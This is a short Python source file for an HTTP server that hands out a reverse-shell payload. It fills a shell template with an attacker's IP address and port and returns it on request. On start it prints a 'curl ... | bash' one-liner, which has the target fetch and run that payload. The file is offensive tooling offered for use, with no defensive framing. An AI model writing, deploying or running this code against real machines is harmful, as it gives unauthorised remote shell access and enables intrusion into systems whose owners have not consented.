import http.server
from string import Template


class Server(http.server.BaseHTTPRequestHandler):
    def __init__(self, server_address, shell, inet, rport):
        self.server_address = server_address
        self.shell = shell
        self.inet = inet
        self.rport = rport
        print('Serving reverse shell...')
        print(f'curl http://{self.inet}:{server_address[1]}/ | bash')

    def __call__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)

    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-Type', 'text/plain')
        self.end_headers()
        shell = self.define_shell()
        print(f'Shell served:\t{shell}')
        self.wfile.write(str.encode(shell))
        return

    def define_shell(self):
        return Template(self.shell).substitute(ip=self.inet, port=self.rport)
